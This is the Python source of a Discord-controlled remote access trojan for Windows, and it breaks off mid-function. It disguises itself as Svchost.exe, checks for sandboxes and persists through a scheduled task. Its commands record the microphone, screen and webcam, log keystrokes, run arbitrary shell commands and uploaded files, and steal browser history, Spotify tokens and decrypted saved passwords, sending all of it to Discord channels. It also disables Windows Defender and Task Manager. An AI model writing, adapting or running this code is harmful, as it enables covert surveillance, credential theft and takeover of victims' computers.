
import discord
from discord.ext import commands
import asyncio
import pyperclip
import subprocess
import os
import sys
import time
import qrcode
import json
import base64
import socket
import shutil
import ctypes
import tempfile
import getpass
import random
import string
import threading
import subprocess
import asyncio
import sqlite3
import requests
import platform
import discord
from discord.ext import commands
from discord import File, Embed
from datetime import datetime
from pynput import keyboard
import pyttsx3
import aiofiles
import aiohttp
# Bot Token/Webhook Setup 
config_url = ""  # Replace with your pastebin link with bot token/webhook
def load_credentials(url):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            lines = response.text.strip().splitlines()
            token = lines[0].strip() if len(lines) > 0 else None
            webhook = lines[1].strip() if len(lines) > 1 else None
            return token, webhook
    except Exception as e:
        print(f"Failed to load credentials: {e}")
    return None, None
BOT_TOKEN, WEBHOOK_URL = load_credentials(config_url)
if not BOT_TOKEN or not WEBHOOK_URL:
    exit(1)
keylog_active = False
keylog_channel = None
current_sentence = ""
entries_log = []

# svchost
def svchost():
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    SetConsoleTitleW = kernel32.SetConsoleTitleW
    SetConsoleTitleW.argtypes = [ctypes.c_wchar_p]
    SetConsoleTitleW.restype = ctypes.c_bool
    SetConsoleTitleW("Svchost.exe")

# MASTER KEY
def get_master_key(path):
    try:
        with open(path, 'r') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"")
        return None

# Simple Vm Check
def Vm_1():
    import platform, os, uuid, psutil
    vm_users = ["WDAGUtilityAccount", "sandbox", "user", "test"" JOHN-PC", "Testing", "vm"]
    vm_mac_prefixes = ["00:05:69", "00:0C:29", "00:1C:14", "00:50:56"]
    if any(user.lower() in os.getenv("USERNAME", "").lower() for user in vm_users):
        return True
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                   for ele in range(0,8*6,8)][::-1])
    if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
        return True
    if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
        return True
    if psutil.cpu_count(logical=False) < 2:
        return True
    return False   

# Bot Token
import os
import getpass
from discord.ext import commands
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True
bot = commands.Bot(command_prefix=".", intents=intents)
bot.remove_command("help")  
@bot.event

# Bot Connected
@bot.event
async def on_ready():
    for guild in bot.guilds:
        me = guild.me
        if me.nick != "Discord Rat":
            try:
                await me.edit(nick="Discord Rat")
            except Exception as e:
                print(f"Failed to set nickname in {guild.name}: {e}")
    if hasattr(bot, 'already_ready'):
        return
    bot.already_ready = True
    await bot.change_presence(activity=discord.Game(name="Discord Rat by @deadconvicess"))
    session_start_time = time.time()
    username = platform.node()
    pc_name = os.getenv("COMPUTERNAME") or platform.node()
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
    except:
        ip_address = "Unknown"
    country = "Unknown"
    try:
        ip_info = requests.get("https://ipinfo.io/json", timeout=5).json()
        country = ip_info.get("country", "Unknown")
    except:
        pass
    guild = discord.utils.get(bot.guilds)
    if not guild:
        return
    base_channel_name = f"{username.lower()}"
    existing = [ch for ch in guild.text_channels if ch.name.startswith(base_channel_name)]
    channel_name = f"{base_channel_name}-{len(existing) + 1}"
    try:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        log_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
    except:
        return
    online_seconds = int(time.time() - session_start_time)
    online_minutes = online_seconds // 60
    online_display = f"{online_minutes} min(s)" if online_minutes else f"{online_seconds} sec(s)"
    description = (  
    "```ansi\n"
    "\u001b[48;5;235m\u001b[1;37m══════════════════════════════════════════\u001b[0m\n"  
    f"\u001b[1;37m👤 Hostname :\u001b[0m {username}\n"  
    f"\u001b[1;37m📍 Country  :\u001b[0m {country}\n"  
    f"\u001b[1;37m🌐 IP       :\u001b[0m {ip_address}\n"  
    f"\u001b[1;33m`.help` for commands.\u001b[0m\n"  
    "\u001b[48;5;235m\u001b[1;37m══════════════════════════════════════════\u001b[0m\n"  
    "```"
)
    embed = discord.Embed(
        title="Discord Rat Connected.",
        description=description,
        color=0x2F3136  
    )
    try:
        await log_channel.send(embed=embed)
        await log_channel.edit(topic=f"Client session for {username}")
    except:
        pass

# Install Pips 
def install(package):
    try:
        __import__(package)
    except ImportError:
        subprocess.call(
            [sys.executable, "-m", "pip", "install", package],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
required_packages = [
    "discord", "requests", "pypiwin32", "pycaw", "comtypes",
    "opencv-python", "numpy", "sounddevice", "scipy", "pyautogui",
    "pynput", "cryptography", "pycryptodome", "pillow", "aiofiles",
    "pyttsx3"
]
for package in required_packages:
    install(package)

# Txt Commands
async def send_command_list(ctx, filename, commands):
    path = os.path.join(os.getenv("TEMP"), filename)
    async with aiofiles.open(path, "w", encoding="utf-8") as f:
        await f.write(commands)
    await ctx.send(file=File(path))
    await asyncio.sleep(2)
    try:
        os.remove(path)
    except Exception as e:
        print(f"Failed to delete {filename}: {e}") 

# Gettting User Profiles
user_profile = os.environ.get("USERPROFILE", "") 
file_path = os.path.join(user_profile, "AppData", "Local", "Google", "Temp", "wp.jpg")
print(f"The file path is: {file_path}")
if os.path.exists(file_path):
    print(f"The file exists: {file_path}")
else:
    print(f"The file does not exist: {file_path}")

# System Info From Victim
@bot.command()
async def info(ctx):
    import platform, socket
    user = os.getenv("USERNAME")
    comp = os.getenv("COMPUTERNAME")
    ip = socket.gethostbyname(socket.gethostname())
    sysinfo = f"User: {user}\nPC: {comp}\nIP: {ip}\nOS: {platform.system()} {platform.release()}"
    await ctx.send(f"```{sysinfo}```")

# Microphone From Victim
@bot.command()
async def mic(ctx):
    try:
        import sounddevice as sd
        from scipy.io.wavfile import write
        import numpy as np
        loot_dir = os.path.join(os.path.expandvars("%USERPROFILE%\\OneDrive\\Documents"), "OfficeLogs")
        os.makedirs(loot_dir, exist_ok=True)
        path = os.path.join(loot_dir, "Victimsmic.wav")
        duration = 15 
        samplerate = 44100
        await ctx.send("️Recording Now")
        audio = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=1)
        sd.wait()
        write(path, samplerate, audio)
        await ctx.send(file=discord.File(path))
    except Exception as e:
        await ctx.send(f"Mic record failed: {e}")

# Screen Record Victims Pc 
@bot.command()
async def record(ctx):
    try:
        import pyautogui
        import cv2
        import numpy as np
        import time
        loot_dir = os.path.join(os.path.expandvars("%USERPROFILE%\\OneDrive\\Documents"), "OfficeLogs")
        os.makedirs(loot_dir, exist_ok=True)
        path = os.path.join(loot_dir, "Victims Screen.mp4")
        duration = 10 
        fps = 60
        screen_size = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter(path, fourcc, fps, screen_size)
        await ctx.send("Started")
        start_time = time.time()
        while time.time() - start_time < duration:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)
        out.release()
        await ctx.send(file=discord.File(path))
    except Exception as e:
        await ctx.send(f"")

# Victims Webcam
@bot.command()
async def webcam(ctx):
    try:
        import cv2
        import os
        stealth_dir = os.path.join(os.getenv("APPDATA"), "System32", "WinEvent")
        os.makedirs(stealth_dir, exist_ok=True)
        os.system(f'attrib +h "{stealth_dir}"')
        image_path = os.path.join(stealth_dir, "syscam.png")
        cam = None
        for idx in range(3):
            test = cv2.VideoCapture(idx, cv2.CAP_MSMF)
            if test.isOpened():
                cam = test
                break
        if not cam or not cam.isOpened():
            await ctx.send("No webcam available.")
            return
        cam.read() 
        ret, frame = cam.read()
        if ret:
            cv2.imwrite(image_path, frame)
            await ctx.send(file=discord.File(image_path))
            os.remove(image_path)  
        cam.release()
        cv2.destroyAllWindows()
    except Exception:
        await ctx.send("failed.")

# Run Cmd/Shell Commands
@bot.command()
async def shell(ctx, *, cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        await ctx.send(f"```{output.decode(errors='ignore')[:1900]}```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Error: {e.output.decode(errors='ignore')}")
    except Exception as e:
        await ctx.send(f"Exception: {str(e)}")

# Grab Browser History
@bot.command()
async def history(ctx):
    import shutil, sqlite3, tempfile, datetime
    loot_dir = "C:\\Windows\\apppatch\\Custom\\Custom43"
    os.makedirs(loot_dir, exist_ok=True)
    history_log = os.path.join(loot_dir, "browser_history.txt")
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "OperaGX": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
        "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
        "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
    }
    with open(history_log, "w", encoding="utf-8") as out:
        for name, base_path in browsers.items():
            try:
                profile = os.path.join(base_path, "Default")
                history_file = os.path.join(profile, "History")
                if "Opera" in name:
                    history_file = os.path.join(base_path, "History")

                if not os.path.exists(history_file):
                    continue
                temp_copy = os.path.join(tempfile.gettempdir(), f"{name}_history")
                shutil.copy2(history_file, temp_copy)
                con = sqlite3.connect(temp_copy)
                cursor = con.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                results = cursor.fetchall()
                if results:
                    out.write(f"\n====== {name} ======\n")
                    for url, title, last_time in results:
                        date = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=last_time)
                        out.write(f"[{date.strftime('%Y-%m-%d %H:%M:%S')}] {title} - {url}\n")
                con.close()
                os.remove(temp_copy)
            except Exception as e:
                out.write(f"\n{name} failed: {str(e)}\n")
    try:
        await ctx.send(file=discord.File(history_log))
    except:
        await ctx.send("Could not send history file.")

# Upload file To Victims Pc 
@bot.command()
async def up(ctx):
    """Executes uploaded file"""
    try:
        if not ctx.message.attachments:
            return await ctx.send("Attach A file.")
        base_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Themes", "CachedFiles", "Uploads")
        os.makedirs(base_dir, exist_ok=True)
        status_messages = []
        for attachment in ctx.message.attachments:
            file_bytes = await attachment.read()
            file_path = os.path.join(base_dir, attachment.filename)
            with open(file_path, "wb") as f:
                f.write(file_bytes) 
            try:
                subprocess.Popen(file_path, creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
                status_messages.append(f"Ran `{attachment.filename}`.")
            except Exception as exec_error:
                status_messages.append(f"{exec_error}")
        await ctx.send("\n".join(status_messages))
    except Exception as e:
        await ctx.send(f"failed {e}")

# Exit Bot
@bot.command()
async def exit(ctx):
    await ctx.send("Rat Is Disconnected.")
    await bot.close()

#Self Delete (Emergency)
@bot.command()
async def sd(ctx):
    await ctx.send("Rat Is Gone:)")
    await bot.close()
    import tempfile
    bat = os.path.join(tempfile.gettempdir(), "system.bat")
    with open(bat, "w") as f:
        f.write(f'''
        @echo off
        timeout /t 2 > NUL
        del "{sys.argv[0]}" /f /q
        del "{bat}" /f /q
        ''')
    os.system(f'start /min "" "{bat}"')

# Spotify Grabber
@bot.command()
async def sp(ctx):
    try:
        import os, re, json, requests, sqlite3, shutil, base64, tempfile, uuid, time
        from pathlib import Path
        import win32crypt
        from Crypto.Cipher import AES
        loot_dir = os.path.join(os.path.expandvars("%USERPROFILE%\\OneDrive\\Documents"), "OfficeLogs")
        os.makedirs(loot_dir, exist_ok=True)
        output = os.path.join(loot_dir, "spotify_loot.txt")
        found_tokens = []
        account_info = []
        browser_paths = [
            os.getenv("APPDATA") + "\\Spotify\\Local Storage\\leveldb",
            os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data",
            os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data",
            os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data",
            os.getenv("APPDATA") + "\\Opera Software\\Opera Stable",
            os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable",
            os.getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data",
            os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data",
            os.getenv("LOCALAPPDATA") + "\\Chromium\\User Data"  
]    
        def extract_spotify_tokens(leveldb_folder):
            if not os.path.exists(leveldb_folder):
                return []
            tokens = []
            for file_name in os.listdir(leveldb_folder):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                with open(os.path.join(leveldb_folder, file_name), 'r', errors="ignore") as file:
                    content = file.read()
                    matches = re.findall(r'"accessToken":"(.*?)"', content)
                    for token in matches:
                        if token not in tokens:
                            tokens.append(token)
            return tokens
        spotify_leveldb = os.path.join(os.getenv("APPDATA"), "Spotify", "Local Storage", "leveldb")
        if os.path.exists(spotify_leveldb):
            found_tokens.extend(extract_spotify_tokens(spotify_leveldb))
        headers_template = {
            "Authorization": "", 
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        for token in found_tokens:
            try:
                headers = headers_template.copy()
                headers["Authorization"] = f"Bearer {token}"
                for _ in range(2): 
                    r = requests.get("https://api.spotify.com/v1/me", headers=headers)
                    if r.status_code == 200:
                        user = r.json()
                        account_info.append({
                            "token": token,
                            "email": user.get("email"),
                            "username": user.get("display_name"),
                            "id": user.get("id"),
                            "country": user.get("country"),
                            "product": user.get("product")
                        })
                        break
                    time.sleep(1)
            except Exception as e:
                continue
        def get_browser_spotify_passwords():
            creds = []
            profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Guest Profile", "System Profile"]
            for path in browser_paths:
                for profile in profiles:
                    try:
                        state_path = Path(path) / "Local State"
                        if not state_path.exists():
                            continue
                        with open(state_path, "r", encoding="utf-8") as f:
                            local_state = json.load(f)
                        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                        login_db = Path(path) / profile / "Login Data"
                        if not login_db.exists():
                            continue
                        tmp_name = os.path.join(tempfile.gettempdir(), f"login_copy_{uuid.uuid4().hex}.db")
                        shutil.copy2(login_db, tmp_name)
                        conn = sqlite3.connect(tmp_name)
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for origin, username, password in cursor.fetchall():
                            if "spotify.com" in origin:
                                try:
                                    if password[:3] == b'v10':
                                        iv = password[3:15]
                                        payload = password[15:]
                                        cipher = AES.new(key, AES.MODE_GCM, iv)
                                        decrypted = cipher.decrypt(payload).decode()
                                    else:
                                        decrypted = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
                                    creds.append((origin, username, decrypted))
                                except Exception:
                                    continue
                        conn.close()
                        os.remove(tmp_name)
                    except Exception:
                        continue
            return creds
        browser_creds = get_browser_spotify_passwords()
        with open(output, "w", encoding="utf-8") as f:
            if account_info:
                for acc in account_info:
                    f.write("🎧 Spotify API Account Info\n")
                    f.write(f"User: {acc['username']} (ID: {acc['id']})\n")
                    f.write(f"Email: {acc['email']} | Country: {acc['country']}\n")
                    f.write(f"Plan: {acc['product'].title()}\n")
                    f.write(f"OAuth Token: {acc['token']}\n\n")
            else:
                f.write("No valid Spotify access tokens found.\n\n")
            if browser_creds:
                f.write("🎧 Browser-Saved Spotify Logins:\n")
                for origin, user, pw in browser_creds:
                    f.write(f"{origin} | {user}:{pw}\n")
            else:
                f.write("No Spotify browser logins found.\n")
        await ctx.send(file=discord.File(output))
    except Exception as e:
        await ctx.send(f"Spotify grab failed: {e}")

# Spotify Spam
import subprocess
import threading
import time
import os
def loop_spotify():
    path_options = [
        os.path.join(os.getenv("APPDATA"), "Spotify", "Spotify.exe"),
        os.path.join("C:\\Program Files\\Spotify", "Spotify.exe"),
        os.path.join("C:\\Program Files (x86)\\Spotify", "Spotify.exe")
    ]
    spotify_opened = False
    while not spotify_opened:
        for path in path_options:
            if os.path.exists(path):
                subprocess.Popen([path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                spotify_opened = True 
                break
        time.sleep(15)  
@bot.command()
async def ssp(ctx):
    try:
        threading.Thread(target=loop_spotify, daemon=True).start()
        await ctx.send("Spamming..")
    except Exception as e:
        await ctx.send(f"Failed to launch Spotify: {e}")

# Rick roll
@bot.command()
async def rr(ctx):
    try:
        import webbrowser, threading, time, random
        def spam_roll():
            urls = [
                "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
                "https://youtu.be/dQw4w9WgXcQ",
                "https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=42s",
                "https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ?autoplay=1",
                "https://tinyurl.com/2fcpre6"  
            ]
            for _ in range(5):
                webbrowser.open(random.choice(urls))
                time.sleep(random.uniform(1.5, 3.5))  
        threading.Thread(target=spam_roll, daemon=True).start()
        active_threads.append(t)
        await ctx.send("Rick Rollded")
    except Exception as e:
        await ctx.send(f"")

#Caplock Spammer
@bot.command()
async def cap(ctx):
    try:
        import threading, time
        import ctypes
        from random import uniform
        def toggle_caps():
            KEYEVENTF_EXTENDEDKEY = 0x0001
            KEYEVENTF_KEYUP = 0x0002
            MapVirtualKey = ctypes.windll.user32.MapVirtualKeyW
            keybd_event = ctypes.windll.user32.keybd_event
            for _ in range(100):  
                keybd_event(0x14, MapVirtualKey(0x14, 0), KEYEVENTF_EXTENDEDKEY, 0)
                keybd_event(0x14, MapVirtualKey(0x14, 0), KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0)
                time.sleep(uniform(0.1, 0.3))  
        threading.Thread(target=toggle_caps, daemon=True).start()
        t.start()
        active_threads.append(t)
        await ctx.send("Spamming Caps")
    except Exception as e:
        await ctx.send(f"Failed")

## Getting Dir
def dirrrrr():
    drives = ["C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\"] 
    subpath = os.path.join("Program Files (x86)", "Google", "Temp")
    for drive in drives:
        full_path = os.path.join(drive, subpath)
        try:
            os.makedirs(full_path, exist_ok=True)
            test_file = os.path.join(full_path, "write.test")
            with open(test_file, "w") as f:
                f.write("test")
            os.remove(test_file)
            return full_path
        except:
            continue
    return os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Temp")  
loot_dir = dirrrrr()

# Screenshot Victims Pc
import pyautogui
from PIL import ImageGrab
import time
import os
import discord
from discord.ext import commands
from screeninfo import get_monitors
@bot.command()
async def ss(ctx):
    """Take a screenshot of the primary screen, add an embed, and send it to Discord."""
    try:
        monitors = get_monitors()
        if not monitors:
            return await ctx.send("No monitors detected.")
        primary_monitor = monitors[0]
        screenshot = ImageGrab.grab(bbox=(primary_monitor.x, primary_monitor.y, primary_monitor.width + primary_monitor.x, primary_monitor.height + primary_monitor.y))
        screenshot_path = os.path.join(os.getenv("TEMP"), "primary_screenshot.png")
        screenshot.save(screenshot_path)
        embed = discord.Embed(
            title="Screen Screenshot",
            description="Here's the screenshot of the Victim's screen.",
            color=0x3498db  
        )
        embed.set_image(url="attachment://primary_screenshot.png")  
        await ctx.send(embed=embed, file=discord.File(screenshot_path, "primary_screenshot.png"))
        os.remove(screenshot_path)  
    except Exception as e:
        await ctx.send(f"Failed to take screenshot: {e}")

# Add to Startup
@bot.command()
async def stup(ctx):
    try:
        import getpass, subprocess, os, sys
        task_name = "bot"
        file_path = os.path.abspath(sys.argv[0])
        username = getpass.getuser()
        subprocess.call([
            "schtasks", "/create", "/f",
            "/sc", "onlogon",
            "/tn", task_name,
            "/tr", f'"{file_path}"',
            "/rl", "HIGHEST",
            "/ru", username
        ])

        await ctx.send("Added to Startup")
    except Exception as e:
        await ctx.send(f"Failed to add to startup")

# Remove from Startup
@bot.command()
async def clearstup(ctx):
    try:
        task_name = "bot"
        subprocess.call(["schtasks", "/delete", "/f", "/tn", task_name])
        await ctx.send("Removed From Startup")
    except Exception as e:
        await ctx.send(f"Failed to remove")

# Volume
import discord
from discord.ext import commands
from ctypes import POINTER, cast
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import comtypes
@bot.command()
async def v(ctx, level: int):
    try:
        comtypes.CoInitialize() 
        if not isinstance(level, int):
            return await ctx.send("Please enter a valid integer for volume.")
        if not (0 <= level <= 100):
            return await ctx.send("Please enter a volume between 0 and 100.")
        devices = AudioUtilities.GetSpeakers()
        if not devices:
            return await ctx.send("No audio devices found.")        
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume_control = cast(interface, POINTER(IAudioEndpointVolume))       
        volume_control.SetMasterVolumeLevelScalar(level / 100.0, None)
        current_volume = volume_control.GetMasterVolumeLevelScalar() * 100
        await ctx.send(f"Volume set to {level}%.")
    except Exception as e:
        await ctx.send(f"An error occurred while setting the volume: {e}")
    finally:
        comtypes.CoUninitialize()

# Restart pc
@bot.command()
async def restart(ctx):
    try:
        subprocess.Popen("shutdown /r /t 1", shell=True)
        embed = discord.Embed(
            title="Restarting Victims Pc.",
            description="Done Restarting Pc.",
            color=0x3498db
        )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            title="Restart Failed",
            description=f"Error: `{e}`",
            color=0xe74c3c
        )
        await ctx.send(embed=embed)

# Shutdown pc
@bot.command()
async def shutdown(ctx):
    try:
        subprocess.Popen("shutdown /s /t 1", shell=True)
        embed = discord.Embed(
            title="Shutting Down",
            description="Done",
            color=0x95a5a6
        )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            title="Shutdown Failed",
            description=f"Error: `{e}`",
            color=0xe74c3c
        )
        await ctx.send(embed=embed)

# Task List
import psutil
import discord
from discord.ext import commands
import os
import tempfile
@bot.command()
async def list(ctx):
    """View all running processes with detailed information."""
    try:
        process_list = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info']):
            process_info = (
                f"**PID**: {proc.info['pid']}\n"
                f"**Name**: {proc.info['name']}\n"
                f"**User**: {proc.info['username']}\n"
                f"**CPU Usage**: {proc.info['cpu_percent']}%\n"
                f"**Memory Usage**: {proc.info['memory_info'].rss / (1024 * 1024):.2f} MB\n"
            )
            process_list.append(process_info)
        process_output = "\n\n".join(process_list)
        with tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
            temp_file.write(process_output)
            temp_file_path = temp_file.name  
        await ctx.send(file=discord.File(temp_file_path, "process_list.txt"))
        os.remove(temp_file_path)
        await ctx.send(f"Total processes listed: {len(process_list)}")
    except Exception as e:
        await ctx.send(f"Failed to retrieve processes: {e}")

# Keylogger (Webhook) 
keylog_active = False
keylog_channel = None
current_sentence = ""
entries_log = []
def generate_session_id(length=6):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
async def send_to_channel(content):
    if keylog_channel and content.strip():
        await keylog_channel.send(content.strip())
def format_key(key):
    try:
        if key == keyboard.Key.space:
            return " "
        elif key == keyboard.Key.enter:
            return "\n"
        elif hasattr(key, 'char') and key.char is not None:
            return key.char
        else:
            return f"[{str(key).replace('Key.', '').upper()}]"
    except Exception:
        return ""
def is_sentence_end(char):
    return char in [".", "!", "?", "\n"]
def on_press(key):
    global current_sentence, entries_log
    typed = format_key(key)
    current_sentence += typed
    if is_sentence_end(typed):
        log_entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {current_sentence.strip()}"
        entries_log.append(log_entry)
        if len(entries_log) > 100:
            entries_log.pop(0)
        asyncio.run_coroutine_threadsafe(send_to_channel(log_entry), bot.loop)
        current_sentence = ""
async def flush_unfinished():
    global current_sentence
    while keylog_active:
        if current_sentence.strip():
            log_entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {current_sentence.strip()}"
            entries_log.append(log_entry)
            if len(entries_log) > 100:
                entries_log.pop(0)
            await send_to_channel(log_entry)
            current_sentence = ""
        await asyncio.sleep(5)
@bot.command()
async def key(ctx, action: str = None):
    global keylog_active, keylog_channel, current_sentence, entries_log
    if action == "start":
        if keylog_active:
            await ctx.send("Already Running.")
            return

        category = await ctx.guild.create_category(f"Key1ogger")
        keylog_channel = await category.create_text_channel(f"Victims Keys", overwrites={
            ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
            ctx.author: discord.PermissionOverwrite(read_messages=True)
        })
        keylog_active = True
        current_sentence = ""
        entries_log = []
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        asyncio.create_task(flush_unfinished())
        await ctx.send(f"Started <#{keylog_channel.id}>.")
    elif action == "stop":
        if not keylog_active:
            await ctx.send("Not running.")
            return
        keylog_active = False
        username = getpass.getuser()
        session_id = generate_session_id()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"Victims Keys.txt"
        temp_path = os.path.join(os.getenv('TEMP'), filename)
        with open(temp_path, 'w', encoding='utf-8') as file:
            file.write("\n".join(entries_log))
        await keylog_channel.send(file=File(temp_path))
        os.remove(temp_path)
        embed = Embed(
            title="📄 Keylogger Info",
            description="Vanish Rat - Keylogger",
            color=0x00ffcc
        )
        embed.add_field(name="📝 Filename", value=filename, inline=False)
        embed.add_field(name="🆔 Session ID", value=session_id, inline=False)
        embed.add_field(name="👤 Username", value=username, inline=False)
        embed.add_field(name="⏰ Timestamp", value=timestamp, inline=False)
        await keylog_channel.send(embed=embed)
        await ctx.send("Info Sent.")
    else:
        await ctx.send("Usage: `.key start` or `.key stop`")

# Web Spammer
@bot.command()
async def web(ctx):
    try:
        import threading, webbrowser, random

        urls = [
            "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            "https://pointerpointer.com/",
            "https://theuselessweb.com/",
            "https://corndog.io/",
            "https://www.staggeringbeauty.com/",
            "https://longdogechallenge.com/",
            "https://shadyurl.com/",
            "https://thispersondoesnotexist.com/",
            "https://www.boredbutton.com/"
            "https://www.youtube.com/watch?v=j5E9TUssJzw:"
            "https://en.wikipedia.org/wiki/Ku_Klux_Klan"
        ]

        def spam_tabs():
            for _ in range(20):
                webbrowser.open(random.choice(urls), new=2)
        threading.Thread(target=spam_tabs, daemon=True).start()
        embed = discord.Embed(
            title="Webspam Triggered",
            description="Spams Web",
            color=0xff6699
        )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            title="Webspam Failed",
            description=f"`{e}`",
            color=0xe74c3c
        )
        await ctx.send(embed=embed)

# Disable Win Defender (Not 100%)
@bot.command()
async def dwd(ctx):
    try:
        import subprocess
        defender_kill = """
        Set-MpPreference -DisableRealtimeMonitoring $true;
        Set-MpPreference -DisableBehaviorMonitoring $true;
        Set-MpPreference -DisableBlockAtFirstSeen $true;
        Set-MpPreference -DisableIOAVProtection $true;
        Set-MpPreference -DisablePrivacyMode $true;
        Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true;
        """
        subprocess.call(
            ["powershell", "-Command", defender_kill],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            shell=True
        )
        embed = discord.Embed(
            title="️Defender Disabled",
            description="Disable Windows Defender",
            color=0xff3300
        )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            title="Defender Disabling Failed",
            description=f"`{e}`",
            color=0xe74c3c
        )
        await ctx.send(embed=embed)

# Disable taskkmgr
@bot.command()
async def disable_mgr(ctx):
    try:
        import subprocess
        reg_command = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'
        subprocess.call(reg_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        embed = discord.Embed(
            title="Taskmgr Off",
            description="Task Manager has been disabled",
            color=0xcc0000
        )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            title="Failed to Disable Task Manager",
            description=f"`{e}`",
            color=0xe74c3c
        )
        await ctx.send(embed=embed)

# Enable taskmgr
@bot.command()
async def enable_mgr(ctx):
    try:
        import subprocess
        reg_command = 'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /f'
        subprocess.call(reg_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        embed = discord.Embed(
            title="Checking..",
            description="Taskmgr On",
            color=0x27ae60
        )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            title="Failed to Enable Task Manager",
            description=f"`{e}`",
            color=0xe74c3c
        )
        await ctx.send(embed=embed)

# Wallpaper
@bot.command()
async def wp(ctx, link: str = None):
    try:
        import requests
        import ctypes
        import os
        temp_path = os.path.join(os.getenv("TEMP"), "wallpaper.jpg")
        if ctx.message.attachments:
            await ctx.message.attachments[0].save(temp_path)
        elif link:
            if not link.lower().endswith((".jpg", ".jpeg", ".png", ".bmp")):
                await ctx.send("Only .jpg/.jpeg/.png/.bmp supported.")
                return
            r = requests.get(link, timeout=5)
            with open(temp_path, "wb") as f:
                f.write(r.content)
        else:
            await ctx.send("Provide a link or attach an image.")
            return
        ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_path, 3)
        await ctx.send("Wallpaper changed")
    except Exception as e:
        await ctx.send(f"Failed to set wallpaper: {e}")

# Ip/Geo Grab
@bot.command()
async def geo(ctx):
    try:
        import requests
